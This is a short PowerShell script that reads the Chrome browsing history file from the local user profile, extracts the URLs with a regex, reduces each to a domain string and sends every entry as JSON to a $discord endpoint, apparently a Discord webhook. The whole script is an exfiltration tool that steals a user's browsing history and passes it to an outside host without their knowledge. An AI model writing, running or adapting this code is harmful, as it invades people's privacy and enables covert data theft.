$history = Get-Content -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history" -encoding utf8 | Select-String -Pattern '(htt(p|ps))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' -AllMatches

$decoded = 
Foreach ($entry in $history){
	Foreach($subentry in $entry){

		$url = $entry
			
		$cleanUrl = $url -replace 'http:\/\/','' -replace 'https:\/\/','' -replace '\/.*','' -replace '[^\p{L}\p{Nd}]', ''
		$domain = @{
			'domain' = $cleanUrl
		}
		
	}
	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($domain | ConvertTo-Json) -Verbose
	#Write-Host ($domain)
}
